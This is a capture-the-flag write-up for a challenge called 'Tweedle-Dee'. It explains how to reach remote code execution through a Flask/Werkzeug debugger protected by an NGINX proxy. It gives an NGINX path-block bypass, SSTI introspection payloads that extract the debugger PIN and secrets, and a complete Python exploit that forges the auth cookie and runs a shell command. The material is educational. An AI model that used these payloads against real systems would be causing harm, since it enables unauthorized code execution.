Tweedle-Dee CTF Challenge Writeup

Introduction

This challenge is a hardened iteration of the previous "Tweedle-Dum" challenge. We are provided with the source code and a Docker environment. The goal remains the same: achieve Remote Code Execution (RCE) via the Werkzeug/Flask debug mode.

Infrastructure Setup

The architecture involves an NGINX server acting as a reverse proxy in front of the Flask application.

The file structure is as follows:

.
├── docker-compose.yml
└── src
    ├── app
    │   ├── app.py
    │   └── ...
    └── nginx
        ├── Dockerfile
        └── nginx.conf


1. Reconnaissance & NGINX Analysis

The nginx.conf file reveals strict access controls that were not present in the previous challenge:

server {
    listen 2201;
    server_name _;
    
    # 1. Direct access to the debug console is forbidden
    location /console {
        return 403 "Bye";
    }
    
    # 2. Error stack traces are hidden
    location @error {
        return 500 "Bye";
    }
    
    location / {
        error_page 500 503 @error;
        proxy_intercept_errors on;
        proxy_pass http://app:5000;
    }
}


The Obstacles:

Accessing /console returns a 403 Forbidden.

Triggering server errors (to view stack traces and leak info) returns a generic "Bye" message due to proxy_intercept_errors on.

2. Bypassing the /console Restriction

In the previous challenge, we captured the requests used by the debugger:

PIN Auth: GET /console?__debugger__=yes&cmd=pinauth&pin=...

Command Exec: GET /console?__debugger__=yes&cmd=...

The key realization comes from analyzing the Werkzeug debugger source code. The debugger middleware triggers based on the query parameter __debugger__=yes inside the __call__ method, regardless of the URL path.

Since NGINX only blocks the specific string /console, we can simply send our debugger payloads to the root path / (or any other valid path) while keeping the query parameters.

Bypass: instead of /console?__debugger__=yes, we use /?__debugger__=yes.

3. The Authentication Hurdle

To execute code, we need to pass the PIN authentication check. The server requires a specific cookie to trust the session.

The cookie generation logic in the source code is:

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

# Cookie format: {timestamp}|{hash_pin}


To forge this cookie and execute commands, we need to steal four values from the running application's memory:

The PIN: app.pin

The Secret: app.secret (Used to validate requests)

A Frame ID (frm): Required context for execution.

The Cookie Name: app.pin_cookie_name (Randomly generated).

4. Deep Memory Extraction via SSTI

We cannot see the errors, but the Server-Side Template Injection (SSTI) vulnerability in the User-Agent header (from Tweedle-Dum) is still present.

Since we cannot access the DebuggedApplication instance directly from the template context, we must use Python introspection to find it.

The Concept: Thread Introspection
Flask runs its server loop (serve_forever) on a specific thread. We can access the threading module via the sys module, which allows us to list all active threads.

Step 1: Enumerate Modules
Payload: {ua.__class__.__init__.__globals__[t].sys.modules}
Result: We confirm threading is loaded.

Step 2: Find the Server Thread
Payload: {ua.__class__.__init__.__globals__[t].sys.modules[threading]._active}
Result: This returns a dictionary of active threads. We look for the thread running serve_forever.
Example Output: 140263224297152: <Thread(Thread-1 (serve_forever)...>

Step 3: Extract the Application Object
Once we have the Thread ID (e.g., 140263224297152), we can traverse the object graph to reach the Flask app instance:
thread._target.__self__.app

Step 4: Steal the Secrets
We construct payloads to extract the specific attributes:

PIN: ..._active[ID]._target.__self__.app.pin

Secret: ..._active[ID]._target.__self__.app.secret

Frames: ..._active[ID]._target.__self__.app.frames

Cookie Name: ..._active[ID]._target.__self__.app.pin_cookie_name

5. Final Exploit Script

With the extracted values, we can calculate the PIN hash, forge the session cookie, and send the RCE request to the root path /.

import requests
import hashlib
import time

# --- Exploitation Configuration ---
# These values are obtained via the SSTI thread introspection described above.
# In a real attack, you would parse them dynamically from the SSTI response.
pin = "130-511-916"
secret = "qVxa6ZuktKRrQpXb30vE"
frame_id = "139822799546272" 
cookie_name = "__wzdc1a7d45eec759afe0ac3"
url = "http://localhost:8000" # Target URL

# --- 1. Forge the Authentication Cookie ---
# Logic reversed from source: sha1(pin + " added salt")
salt_suffix = " added salt"
hash_payload = f"{pin}{salt_suffix}".encode("utf-8", "replace")
hash_value = hashlib.sha1(hash_payload).hexdigest()[:12]

print(f"[*] Calculated Hash: {hash_value}")

# Cookie format: {timestamp}|{hash}
cookie_value = f"{int(time.time())}|{hash_value}"
print(f"[*] Forged Cookie: {cookie_value}")

# --- 2. Send RCE Request ---
# We bypass the /console block by sending parameters to the root "/"
# payload: reads the flag using os.popen
cmd_payload = "__import__('os').popen('cat flag*').read()"

params = {
    "__debugger__": "yes", # Triggers the debugger middleware
    "cmd": cmd_payload,
    "frm": frame_id,       # Context frame for execution
    "s": secret            # Secret required for validation
}

headers = {
    "Cookie": f"{cookie_name}={cookie_value}"
}

print(f"[*] Sending exploit to {url}...")
response = requests.get(url, params=params, headers=headers)

print(f"Status: {response.status_code}")
print(f"Response:\n{response.text}")
